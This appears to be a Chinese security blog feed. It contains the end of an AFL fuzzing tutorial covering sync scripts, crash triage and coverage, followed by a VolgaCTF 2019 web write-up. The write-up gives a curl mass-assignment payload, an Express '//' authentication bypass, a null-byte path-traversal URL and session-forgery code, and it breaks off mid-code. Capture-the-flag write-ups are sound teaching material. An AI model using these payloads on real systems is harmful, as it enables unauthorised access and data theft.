class="keyword">fi</span></div><div class="line"><span class="keyword">fi</span></div><div class="line"></div><div class="line">rm -rf .sync_tmp 2&gt;/dev/null</div><div class="line">mkdir .sync_tmp || <span class="built_in">exit</span> 1</div><div class="line"></div><div class="line"><span class="keyword">while</span> :; <span class="keyword">do</span></div><div class="line"></div><div class="line">  <span class="comment"># 打包所有机器上的数据</span></div><div class="line">  <span class="keyword">for</span> host <span class="keyword">in</span> <span class="variable">$FUZZ_HOSTS</span>; <span class="keyword">do</span></div><div class="line">    <span class="built_in">echo</span> <span class="string">"[*] Retrieving data from <span class="variable">$&#123;host&#125;</span>..."</span></div><div class="line">    ssh -o <span class="string">'passwordauthentication no'</span> <span class="variable">$&#123;FUZZ_USER&#125;</span>@<span class="variable">$&#123;host&#125;</span> \</div><div class="line">      <span class="string">"cd '<span class="variable">$SYNC_DIR</span>' &amp;&amp; tar -czf - SESSION*"</span> &gt;<span class="string">".sync_tmp/<span class="variable">$&#123;host&#125;</span>.tgz"</span></div><div class="line">  <span class="keyword">done</span></div><div class="line"></div><div class="line">  <span class="comment"># 分发数据</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> dst_host <span class="keyword">in</span> <span class="variable">$FUZZ_HOSTS</span>; <span class="keyword">do</span></div><div class="line">    <span class="built_in">echo</span> <span class="string">"[*] Distributing data to <span class="variable">$&#123;dst_host&#125;</span>..."</span></div><div class="line">    <span class="keyword">for</span> src_host <span class="keyword">in</span> <span class="variable">$FUZZ_HOSTS</span>; <span class="keyword">do</span></div><div class="line">      <span class="built_in">test</span> <span class="string">"<span class="variable">$src_host</span>"</span> = <span class="string">"<span class="variable">$dst_host</span>"</span> &amp;&amp; <span class="built_in">continue</span></div><div class="line">      <span class="built_in">echo</span> <span class="string">"    Sending fuzzer data from <span class="variable">$&#123;src_host&#125;</span>..."</span></div><div class="line">      ssh -o <span class="string">'passwordauthentication no'</span> <span class="variable">$&#123;FUZZ_USER&#125;</span>@<span class="variable">$dst_host</span> \</div><div class="line">        <span class="string">"cd '<span class="variable">$SYNC_DIR</span>' &amp;&amp; tar -xkzf - &amp;&gt;/dev/null"</span> &lt;<span class="string">".sync_tmp/<span class="variable">$&#123;src_host&#125;</span>.tgz"</span></div><div class="line">    <span class="keyword">done</span></div><div class="line">  <span class="keyword">done</span></div><div class="line"></div><div class="line">  <span class="built_in">echo</span> <span class="string">"[+] Done. Sleeping for <span class="variable">$SYNC_INTERVAL</span> seconds (Ctrl-C to quit)."</span></div><div class="line">  sleep <span class="variable">$SYNC_INTERVAL</span></div><div class="line">  </div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure><h2 id="0x02-Fuzz结果分析和代码覆盖率"><a href="#0x02-Fuzz结果分析和代码覆盖率" class="headerlink" title="0x02 Fuzz结果分析和代码覆盖率"></a>0x02 Fuzz结果分析和代码覆盖率</h2><h3 id="1-工作状态"><a href="#1-工作状态" class="headerlink" title="1. 工作状态"></a>1. 工作状态</h3><p>afl-fuzz永远不会停止，所以何时停止测试很多时候就是依靠afl-fuzz提供的状态来决定的。具体的几种方式如下所示:</p><ul><li>状态窗口的<code>cycles done</code>变为绿色;</li><li><code>afl-whatsup</code>查看afl-fuzz状态;</li><li><code>afl-stat</code>得到类似于afl-whatsup的输出结果;</li><li>定制<code>afl-whatsup</code>-&gt;在所有代码外面加个循环就好;</li><li>用<code>afl-plot</code>绘制各种状态指标的直观变化趋势;</li><li><code>pythia</code>估算发现新crash和path概率。</li></ul><h3 id="2-fuzz结束判断"><a href="#2-fuzz结束判断" class="headerlink" title="2. fuzz结束判断"></a>2. fuzz结束判断</h3><ul><li>状态窗口中”cycles done”字段颜色变为绿色该字段的颜色可以作为何时停止测试的参考;</li><li>距上一次发现新路径（或者崩溃）已经过去很长时间了，至于具体多少时间还是需要自己把握;</li><li>目标程序的代码几乎被测试用例完全覆盖，这种情况好像很少见;</li><li>pythia提供的各种数据中，path covera达到99或者correctness的值达到1e-08(含义: 从上次发现path/uniq crash到下一次发现之间大约需要1亿次执行)</li></ul><h3 id="3-输出结果说明"><a href="#3-输出结果说明" class="headerlink" title="3. 输出结果说明"></a>3. 输出结果说明</h3><blockquote><p>queue：存放所有具有独特执行路径的测试用例。</p><p>crashes：导致目标接收致命signal而崩溃的独特测试用例。</p><p>crashes/README.txt：保存了目标执行这些crash文件的命令行参数。</p><p>hangs：导致目标超时的独特测试用例。</p><p>fuzzer_stats：afl-fuzz的运行状态。</p><p>plot_data：用于afl-plot绘图。</p></blockquote><h3 id="4-对crash结果的简单分析和分类"><a href="#4-对crash结果的简单分析和分类" class="headerlink" title="4. 对crash结果的简单分析和分类"></a>4. 对crash结果的简单分析和分类</h3><ol><li>crash exploration mode<br>afl-fuzz的一种运行模式，也称为peruvian rabbit mode，用于确定bug的可利用性，其输入的是crash的信息，之后使用<code>-C</code>启用这种模式，afl会自动探索并创造与之相关的crash来帮助你进行分析，比如判断能够控制某块内存地址的长度。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">afl-fuzz -m none -C -i ./fuzz_out/crashes -o ./peruvian-were-rabbit_out -- ./vuln -f</div></pre></td></tr></table></figure><ol><li>triage_crashes.sh<br>AFL源码的experimental目录中有一个名为triage_crashes.sh的脚本，可以帮助我们触发收集到的crashes。</li></ol><p>直接使用脚本跟参数的话，我们可以看到相关crash情况的寄存器等信息，但是如果只是大致分类的话，可以使用如下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/root/Desktop/fuzz/afl/experimental/crash_triage/triage_crashes.sh ./fuzz_out ./vuln 2&gt;&amp;1 | grep SIGNAL</div></pre></td></tr></table></figure><p>效果如下，11代表了SIGSEGV信号，有可能是因为缓冲区溢出导致进程引用了无效的内存<br><img src="https://i.loli.net/2019/05/15/5cdc199e5ce5630635.png" alt="0C1CB900-EA6C-4814-A67E-1FBE5994AB87.png"></p><ol><li>crashwalk<br>优点:可以显示更为详细的信息<br>项目地址: <a href="https://github.com/bnagy/crashwalk" target="_blank" rel="external">https://github.com/bnagy/crashwalk</a></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># 手动模式</div><div class="line">~/go/bin/cwtriage -root ./fuzz_out/crashes -match id -- ./vuln -f</div><div class="line"># afl自动化模式</div><div class="line">~/go/bin/cwtriage -root ./fuzz_out/crashes -afl</div></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/15/5cdc1aa2edc5a77745.png" alt="6DD9C8EA-E494-4633-9F84-3F6B7959CD74.png"></p><ol><li>afl-collect</li></ol><p>项目地址: <a href="https://github.com/rc0r/afl-utils" target="_blank" rel="external">https://github.com/rc0r/afl-utils</a><br>afl-collect基于exploitable来检查crashes的可利用性。它可以自动删除无效的crash样本、删除重复样本以及自动化样本分类。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">afl-collect -j 8 -d crashes.db -e gdb_script ./fuzz_out ./fuzz_in --  ./vuln --target-opts</div></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://i.loli.net/2019/05/15/5cdc1abdd38ea24456.png" alt="D9712AE7-55FB-4A82-B974-0D418D4C85D7.png"></p><h3 id="5-代码覆盖率"><a href="#5-代码覆盖率" class="headerlink" title="5. 代码覆盖率"></a>5. 代码覆盖率</h3><p>原理部分参考:<br><a href="https://www.freebuf.com/column/197672.html" target="_blank" rel="external">《AFL漏洞挖掘技术漫谈（二）：Fuzz结果分析和代码覆盖率》</a></p><p>afl-cov的使用说明如下:<br>首先使用gcov重新编译源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -fprofile-arcs -ftest-coverage vuln.c -o vuln_cov</div></pre></td></tr></table></figure><p>如果遇到需要make进行编译的文件，执行如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ make clean</div><div class="line">$ ./configure --prefix=/root/tiff-4.0.10/build-cov CC=&quot;gcc&quot; CXX=&quot;g++&quot; CFLAGS=&quot;-fprofile-arcs -ftest-coverage&quot; --disable-shared</div><div class="line">$ make</div><div class="line">$ make install</div></pre></td></tr></table></figure><p>之后使用afl-cov来计算覆盖率</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">afl-cov -d ./fuzz_out --live --enable-branch-coverage -c . -e &quot;cat AFL_FILE | ./vuln_cov AFL_FILE&quot;</div></pre></td></tr></table></figure><p>同时进行对插桩过的<code>vuln</code>的fuzz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">afl-fuzz -i ./fuzz_in -o ./fuzz_out ./vuln -f</div></pre></td></tr></table></figure><p>最终效果如下<br><img src="https://i.loli.net/2019/05/15/5cdc1ad66119394310.png" alt="60FD6E10-65F2-4CC1-B270-218F679D59B0.png"></p><p>生成的报告会保存在<code>/path/to/afl-fuzz-output/cov/web/lcov-web-final</code>路径下。</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>VolgaCTF 2019 Qualifier Web</title>
      <link href="/2019/04/03/VolgaCTF-2019-Qualifier-Web/"/>
      <url>/2019/04/03/VolgaCTF-2019-Qualifier-Web/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>比赛地址: <a href="https://q.2019.volgactf.ru/tasks" target="_blank" rel="external">https://q.2019.volgactf.ru/tasks</a></p><p>时间: 星期五, 三月 29, 11:00 PM (23:00) — 星期日, 三月 31, 11:00 PM (23:00)</p><h2 id="0x01-shop"><a href="#0x01-shop" class="headerlink" title="0x01 shop"></a>0x01 shop</h2><ol><li>信息泄露 robots.txt-&gt;shop.1.0.0.war</li><li>此处我直接使用idea自动对代码进行反编译，来对代码进行审计 漏洞主要存在于buy的路由处，在此处使用了spring mvc的<code>@ModelAttribute</code>。它的作用是从modle中获取一个对象，然后使用用户的请求request来赋值，这就造成我们可以对其中的某些变量进行控制。漏洞类型属于自动绑定漏洞。 从user类中我们看到可以控制balance。(PS:自动绑定漏洞是调用set和get方法的并不是直接操控变量或者数据库值)</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> Integer <span class="title">getBalance</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.balance;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBalance</span><span class="params">(Integer weight)</span> </span>&#123;</div><div class="line">    <span class="keyword">this</span>.balance = weight;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>而从程序的校验来看如果可以控制balance那么就可以满足校验，从而成功购买flag</p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@RequestMapping</span>(&#123;<span class="string">"/buy"</span>&#125;)</div><div class="line"><span class="function"><span class="keyword">public</span> String <span class="title">buy</span><span class="params">(@RequestParam Integer productId, @ModelAttribute(<span class="string">"user"</span>)</span> User user, RedirectAttributes redir, HttpServletRequest request) </span>&#123;</div><div class="line">    HttpSession session = request.getSession();</div><div class="line">    <span class="keyword">if</span> (session.getAttribute(<span class="string">"user_id"</span>) == <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="string">"redirect:index"</span>;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        Product product = <span class="keyword">this</span>.productDao.geProduct(productId);</div><div class="line">        <span class="keyword">if</span> (product != <span class="keyword">null</span>) &#123;</div><div class="line">            <span class="keyword">if</span> (product.getPrice() &lt;= user.getBalance()) &#123;</div><div class="line">                user.setBalance(user.getBalance() - product.getPrice());</div><div class="line">                user.getCartItems().add(product);</div><div class="line">                <span class="keyword">this</span>.userDao.update(user);</div><div class="line">                redir.addFlashAttribute(<span class="string">"message"</span>, <span class="string">"Successful purchase"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="string">"redirect:profile"</span>;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            redir.addFlashAttribute(<span class="string">"message"</span>, <span class="string">"Not enough money"</span>);</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            redir.addFlashAttribute(<span class="string">"message"</span>, <span class="string">"Product not found"</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">return</span> <span class="string">"redirect:index"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -i http://shop.q.2019.volgactf.ru/buy --cookie &quot;JSESSIONID=9C636630989A68978E11C28CCAABA31F&quot; --data &quot;productId=4&amp;balance=100000&quot; -L</div></pre></td></tr></table></figure><p>flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">VolgaCTF&#123;c6bc0c68f0d0dac189aa9031f8607dba&#125;</div></pre></td></tr></table></figure><h2 id="0x02-HeadHunter"><a href="#0x02-HeadHunter" class="headerlink" title="0x02 HeadHunter"></a>0x02 HeadHunter</h2><h2 id="0x03-Gallery"><a href="#0x03-Gallery" class="headerlink" title="0x03 Gallery"></a>0x03 Gallery</h2><ol><li>进行信息收集 使用dirsearch收集到如下信息</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">[22:14:44] 301 -  194B  - /js  -&gt;  http://142.93.204.169/js/</div><div class="line">[22:18:24] 403 -    0B  - /api/error_log</div><div class="line">[22:18:24] 403 -    0B  - /api/</div><div class="line">[22:18:24] 200 -   35B  - /api</div><div class="line">[22:18:24] 200 -   35B  - /apibuild.pyc</div><div class="line">[22:19:20] 301 -  194B  - /css  -&gt;  http://142.93.204.169/css/</div><div class="line">[22:20:09] 301 -  194B  - /js  -&gt;  http://142.93.204.169/js/</div><div class="line">[22:20:18] 200 -    3KB - /login</div><div class="line">[22:20:18] 200 -    3KB - /login.cgi</div><div class="line">[22:20:18] 200 -    3KB - /login.html</div><div class="line">[22:20:18] 200 -    3KB - /login.jsp</div><div class="line">[22:20:18] 200 -    3KB - /login.js</div><div class="line">[22:20:18] 200 -    3KB - /login.php</div><div class="line">[22:20:18] 200 -    3KB - /login.pl</div><div class="line">[22:20:19] 200 -    3KB - /login.rb</div><div class="line">[22:20:19] 200 -    3KB - /login.shtml</div><div class="line">[22:20:19] 200 -    3KB - /login.py</div><div class="line">[22:20:19] 200 -    3KB - /login.srf</div><div class="line">[22:20:19] 200 -    3KB - /login/</div><div class="line">[22:20:19] 200 -    3KB - /login/admin/</div><div class="line">[22:20:19] 200 -    3KB - /login/cpanel/</div><div class="line">[22:20:19] 200 -    3KB - /login/cpanel.js</div><div class="line">[22:20:19] 200 -    3KB - /login.htm</div><div class="line">[22:20:19] 200 -    3KB - /login/oauth/</div><div class="line">[22:20:19] 200 -    3KB - /login_admin.js</div><div class="line">[22:20:19] 200 -    3KB - /login_admin</div><div class="line">[22:20:19] 200 -    3KB - /logins.txt</div><div class="line">[22:20:20] 200 -    3KB - /login/administrator/</div><div class="line">[22:20:43] 200 -  459B  - /package.json</div><div class="line">[22:21:18] 301 -  194B  - /sessions  -&gt;  http://142.93.204.169/sessions/</div><div class="line">[22:21:18] 200 -  169B  - /sessions/</div></pre></td></tr></table></figure><p>查看<code>/js/</code>可以列出当前站点的文件</p><p><img src="https://i.loli.net/2019/04/03/5ca43e6e70334.png" alt="3DE72E1C-10EE-467F-9B32-2FFAA471CBD0.png"></p><p>由以上信息基本可以判断出目标站点是一个node.js开发的站点</p><ol><li>源码分析 首先看一下<code>index.js</code>的源码，首先可以看到是基于express框架开发的,<code>${config.apiPrefix}/login</code>,<code>${config.apiPrefix}/logout</code>, <code>${config.apiPrefix}/flag</code>是实现的三个接口，如果想读flag的话，你的session必须是admin</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> express    = <span class="built_in">require</span>(<span class="string">'express'</span>);</div><div class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'express-session'</span>);</div><div class="line"><span class="keyword">const</span> store = <span class="built_in">require</span>(<span class="string">'session-file-store'</span>)(session);</div><div class="line"><span class="keyword">const</span> proxy = <span class="built_in">require</span>(<span class="string">'http-proxy-middleware'</span>);</div><div class="line"><span class="keyword">const</span> parser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</div><div class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"><span class="keyword">const</span> app = express();</div><div class="line"></div><div class="line">config = <span class="built_in">require</span>(<span class="string">'./config'</span>);</div><div class="line">auth = <span class="built_in">require</span>(<span class="string">'./auth'</span>)();</div><div class="line">config.session.store = <span class="keyword">new</span> store();</div><div class="line"></div><div class="line">app.use(parser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</div><div class="line">app.use(<span class="string">`<span class="subst">$&#123;config.apiPrefix&#125;</span>/*`</span>, session(config.session));</div><div class="line">app.use(<span class="string">`<span class="subst">$&#123;config.apiPrefix&#125;</span>/*`</span>, auth.unless(&#123;<span class="attr">path</span>: config.whitelistPaths&#125;));</div><div class="line"></div><div class="line">app.post(<span class="string">`<span class="subst">$&#123;config.apiPrefix&#125;</span>/login`</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="comment">/* <span class="doctag">TODO:</span> Implement login*/</span></div><div class="line">  res.redirect(<span class="string">'/login'</span>);</div><div class="line">&#125;);</div><div class="line"></div><div class="line">app.get(<span class="string">`<span class="subst">$&#123;config.apiPrefix&#125;</span>/logout`</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="comment">/* <span class="doctag">TODO:</span> Implement logout */</span></div><div class="line">  res.redirect(<span class="string">'/login'</span>);</div><div class="line">&#125;);</div><div class="line"></div><div class="line">app.get(<span class="string">`<span class="subst">$&#123;config.apiPrefix&#125;</span>/flag`</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(req.session);</div><div class="line">  <span class="keyword">if</span>(req.session.name === <span class="string">'admin'</span>)</div><div class="line">    res.end(fs.readFileSync(<span class="string">'../../flag'</span>, <span class="string">'utf8'</span>));</div><div class="line">  <span class="keyword">else</span></div><div class="line">    res.status(<span class="number">403</span>).send();</div><div class="line">&#125;);</div><div class="line"></div><div class="line">app.use(proxy(config.proxy));</div><div class="line">app.listen(config.server.port);</div></pre></td></tr></table></figure><p>之后看一下config.js文件的内容，可以知道监听的端口是4000，但是未知强求会转到代理端口5000，所以在这儿是可以列目录来读取源代码的。里面还写到了session的签名，以及白名单路由。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> config = &#123;</div><div class="line">  <span class="attr">apiPrefix</span>: <span class="string">'/api'</span>,</div><div class="line">  <span class="attr">server</span>: &#123;</div><div class="line">    <span class="attr">port</span>: <span class="number">4000</span></div><div class="line">  &#125;,</div><div class="line">  <span class="attr">proxy</span>: &#123;</div><div class="line">    <span class="attr">target</span>: <span class="string">'http://localhost:5000'</span>,</div><div class="line">    <span class="attr">autoRewrite</span>: <span class="literal">true</span></div><div class="line">  &#125;,</div><div class="line">  <span class="attr">session</span>: &#123;</div><div class="line">    <span class="attr">name</span>: <span class="string">'SESSION'</span>,</div><div class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">false</span>,</div><div class="line">    <span class="attr">secret</span>: <span class="string">';GmU1FSlVETF/vzEaBHP'</span>,</div><div class="line">    <span class="attr">rolling</span>: <span class="literal">true</span>,</div><div class="line">    <span class="attr">resave</span>: <span class="literal">false</span></div><div class="line">  &#125;,</div><div class="line">  <span class="attr">whitelistPaths</span>: [</div><div class="line">    <span class="string">'/api/login'</span>, <span class="string">'/api/logout'</span></div><div class="line">  ]</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = config;</div></pre></td></tr></table></figure><p>之前还扫描到了session路径，可见session应该是存储在文件中的。而main.js中又有可以请求文件的方法，所以可能我们可以利用这个点来读与一些文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  year = <span class="built_in">parseInt</span>(location.pathname.slice(<span class="number">1</span>)) || <span class="number">2018</span>;</div><div class="line">  $.getJSON(<span class="string">`/api/images?year=<span class="subst">$&#123;year&#125;</span>`</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</div><div class="line">    $.each(data, <span class="function"><span class="keyword">function</span>(<span class="params">key, img</span>) </span>&#123;</div><div class="line"></div><div class="line">      $(<span class="string">'&lt;div&gt;'</span>, &#123;</div><div class="line">          <span class="attr">class</span>: <span class="string">'col-lg-3 col-md-4 col-xs-6'</span>,</div><div class="line">          <span class="attr">html</span>: $(<span class="string">'&lt;a&gt;'</span>, &#123;</div><div class="line">            <span class="attr">href</span>: <span class="string">`/api/image?year=<span class="subst">$&#123;year&#125;</span>&amp;img=<span class="subst">$&#123;img&#125;</span>`</span>,</div><div class="line">            <span class="attr">class</span>: <span class="string">'d-block mb-4 h-100'</span>,</div><div class="line">            <span class="attr">html</span>: $(<span class="string">'&lt;img&gt;'</span>, &#123;</div><div class="line">              <span class="attr">class</span>: <span class="string">'img-fluid img-thumbnail'</span>,</div><div class="line">              <span class="attr">src</span>: <span class="string">`/api/image?year=<span class="subst">$&#123;year&#125;</span>&amp;img=<span class="subst">$&#123;img&#125;</span>`</span>,</div><div class="line">              <span class="attr">alt</span>: <span class="string">''</span></div><div class="line">            &#125;)</div><div class="line">          &#125;)</div><div class="line">       &#125;).appendTo($(<span class="string">'#gallery'</span>));;</div><div class="line">    &#125;);</div><div class="line">  &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; location = <span class="string">'/login'</span>;&#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure><p>auth.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> unless = <span class="built_in">require</span>(<span class="string">'express-unless'</span>);</div><div class="line"></div><div class="line"><span class="keyword">const</span> auth = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> authm = <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(req.session);</div><div class="line">    <span class="keyword">if</span> (!req.session.name) &#123;</div><div class="line">      res.status(<span class="number">403</span>).send();</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">    next();</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  authm.unless = unless;</div><div class="line">  <span class="keyword">return</span> authm;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="built_in">module</span>.exports = auth;</div></pre></td></tr></table></figure><ol><li>tips 在进行下一步测试之前，先提三个tips: (1) Express框架处理路径的时候是不规范的，因此<code>/</code>,<code>//</code>是存在区别的可以用于某些情况下的bypass； (2) PHP的小bug，%00截断（null byte injection）致使file_exists出错进而列目录； (3) session-file-store模块会将session存在json格式的文件中，如果指定session所在的目录，express-session模块将会去对应的目录下取出session信息；</li><li>漏洞利用 有了以上的信息，我们首先测试main.js提供的<code>/api/images?year=${year}</code>接口。首先利用第一个tips，express的非规范化路径，绕过auth.js的认证。 <img src="https://i.loli.net/2019/04/03/5ca43e9ac1757.png" alt="2CD29029-253F-4C33-AB17-48ED2554C4D9.png"> <code>//</code>的情况如下，可以看到已经绕过了认证并且应该可以读文件了。 <img src="https://i.loli.net/2019/04/03/5ca43ed8b02d6.png" alt="613A1694-476E-43B2-ABE4-2518DD27D02C.png"> 但是当尝试读取image的时候却出现了如下报错，从错误信息上我们可以得到如下两点信息:首先，绝对路径是<code>/var/www/apps/volga_gallery/storage/app/2019/img/</code>；其次，这是一个laravel框架。<img src="https://i.loli.net/2019/04/03/5ca43efc015d1.png" alt="56CE4CC6-3037-4150-B587-42670A1DC4F0.png"> 其实是我输入的年份没有图片，我修改为2018即得到如下信息，所以确认可以列目录下文件了。 <img src="https://i.loli.net/2019/04/03/5ca43f204bc89.png" alt="4799816A-91C8-483F-94C0-B9949972CF3A.png"> 之前知道后端是采用PHP框架处理，所以我先在2018路径后注入%00，之后成功得到当前目录 <img src="https://i.loli.net/2019/04/03/5ca43f52e73eb.png" alt="24B686AC-603E-4CEE-A0F5-9F411FEE092B.png"> 之后继续查看其它目录信息,最终在<code>//api/images?year=2018/../../../../volga_adminpanel%00</code>路径下找到了session信息 <img src="https://i.loli.net/2019/04/03/5ca43f8dc3c19.png" alt="B4CEB3D9-21DC-4625-9240-3F20EA3B2366.png"> <img src="https://i.loli.net/2019/04/03/5ca43fab8e34f.png" alt="BC67D40F-5399-4913-81D4-AE7364663FB9.png"> <img src="https://i.loli.net/2019/04/03/5ca43fc400c8b.png" alt="659D85A9-3C60-4956-AC7A-55BCF3E3784E.png"> 但是我们并不能直接读取这个文件，因此就用到第3个tips，直接在cookie字段这个路径写入。但是这里是设计session的计算问题的。我在本地搭建了一个环境，修改了部分代码。 node_modules/express-session/index.js</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">setcookie</span>(<span class="params">res, name, val, secret, options</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> signed = <span class="string">'s:'</span> + signature.sign(val, secret);</div><div class="line">  <span class="keyword">var</span> data = cookie.serialize(name, signed, options);</div><div class="line"></div><div class="line">  <span class="comment">// sign my payload</span></div><div class="line">  <span class="keyword">var</span> signed2 = <span class="string">'s:'</span> + signature.sign(<span 